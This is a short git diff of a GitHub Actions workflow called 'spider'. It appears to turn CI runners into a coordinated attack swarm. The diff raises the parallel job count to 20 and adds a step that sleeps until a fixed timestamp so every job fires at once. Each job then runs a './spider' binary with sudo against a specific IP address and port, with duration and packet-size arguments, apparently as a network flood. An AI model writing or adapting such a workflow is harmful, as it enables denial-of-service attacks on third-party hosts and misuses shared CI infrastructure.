@@ -1,4 +1,4 @@
-# run 3956d312a11949cf9a3da0e75b4f2523
+# run ef58cbfab2574ac5ae53a614ca47647a
 name: spider
 on:
   push:
@@ -13,10 +13,16 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]
+        n: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
     steps:
     - uses: actions/checkout@v4
+    - name: sync
+      run: |
+        target=1794258833
+        now=$(date +%s)
+        wait=$((target-now))
+        if [ "$wait" -gt 0 ]; then sleep "$wait"; fi
     - name: run
       run: |
         chmod +x ./spider
-        sudo ./spider 91.108.17.17 32002 120 1024 vc
+        sudo ./spider 91.108.17.33 32003 30 1024 vc
